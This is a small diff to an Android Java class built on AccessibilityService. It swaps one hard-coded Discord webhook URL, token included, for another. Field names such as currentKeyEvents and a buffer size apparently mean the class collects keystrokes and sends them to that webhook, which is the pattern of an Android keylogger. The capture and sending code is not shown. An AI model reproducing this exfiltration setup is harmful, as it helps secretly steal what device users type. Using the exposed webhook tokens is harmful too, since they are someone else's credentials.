@@ -20,7 +20,7 @@ import java.util.List;
 
 public class MyAccessibilityService extends AccessibilityService {
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1215008300521889874/9OkkdCHwtk1C81qx5dyV3ztHIfIVOIP1yXKIUmnKYxKUWrND4yQnmiYpuqkD4oYuMdPj";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1473773655325675602/mnP4aEDFOx6M_d6YaRPp4w6JdXqbWFt0ntIBk0kSJnXrmcCkaA-wDr2P7rwtX9wZ899m";
     private static final int MAX_BUFFER_SIZE = 25;
 
     private final StringBuilder currentKeyEvents = new StringBuilder();
